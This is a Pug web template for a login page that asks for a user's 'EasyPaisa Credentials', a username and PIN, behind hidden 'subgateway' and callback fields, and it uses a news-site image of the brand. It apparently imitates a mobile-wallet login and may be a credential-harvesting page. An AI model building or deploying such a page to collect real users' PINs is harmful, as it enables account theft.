  style.
    .fade {
    opacity:0.7;
    filter: alpha(opacity=20);
    background-color:#000;
    width:100%;
    height:100%;
    z-index:10;
    top:0;
    left:0;
    position:fixed;
    pointer-events: none;
    background-image: url('https://upload.wikimedia.org/wikipedia/commons/2/29/Loader.gif');
    background-repeat: no-repeat;
    background-attachment: fixed;
    background-position: center;
    }
  // ===============================================================================================
.limiter
  .container-login100
    .wrap-login100
      .login100-pic.js-tilt(data-tilt='')
        img(src='https://i.tribune.com.pk/media/images/869408-easypaisa-1428958423/869408-easypaisa-1428958423.jpg' alt='IMG')
      form.login100-form.validate-form(method='post')
        span.login100-form-title
          | Please enter your EasyPaisa Credentials
        input(type='hidden' name='Channel' value='subgateway')
        input(type='hidden' name='Callback' value='')
        .wrap-input100
          input.input100(type='text' name='username' placeholder='User')
          span.focus-input100
          span.symbol-input100
            i.fa.fa-envelope(aria-hidden='true')
        .wrap-input100.validate-input(data-validate='Password is required')
          input.input100(type='password' name='pass' placeholder='Pin')
          span.focus-input100
          span.symbol-input100
            i.fa.fa-lock(aria-hidden='true')
        .container-login100-form-btn
          button.login100-form-btn
            | Login
        br
        div(style='padding: 25px')
          br
